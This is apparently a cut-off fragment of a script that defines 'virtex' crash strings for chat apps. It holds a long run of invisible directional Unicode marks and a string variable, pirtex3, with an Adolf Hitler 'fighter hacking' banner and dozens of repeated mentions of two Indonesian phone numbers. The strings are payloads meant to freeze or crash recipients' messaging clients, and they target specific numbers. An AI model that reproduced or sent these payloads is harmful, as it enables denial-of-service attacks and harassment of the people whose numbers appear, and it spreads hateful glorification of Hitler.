‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎'
				pirtex3 = '𝑨𝒅𝒐𝒇𝒇 𝑯𝒊𝒕𝒍𝒆𝒓🇩🇪 𝑿 ღ❦☬🅵🅸🅶🅷🆃🅴🆁-🅷🅰🅲🅺🅸🅽🅶☬❦ღ 𝑰𝑨𝑴 𝑨𝑫𝑶𝑭𝑭 𝑯𝑰𝑻𝑳𝑬𝑹 𝑨𝑵𝑫 𝑰𝑨𝑴 𝑭𝑰𝑮𝑯𝑻𝑬𝑹 𝑯𝑨𝑪𝑲𝑰𝑵𝑮😎🔥 *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 851-5624-7743⁩ @⁨+62 851-5624-7743⁩ @⁨+62 852-1697-2822⁩ @⁨+62 852-1697-2822⁩* *@⁨+62 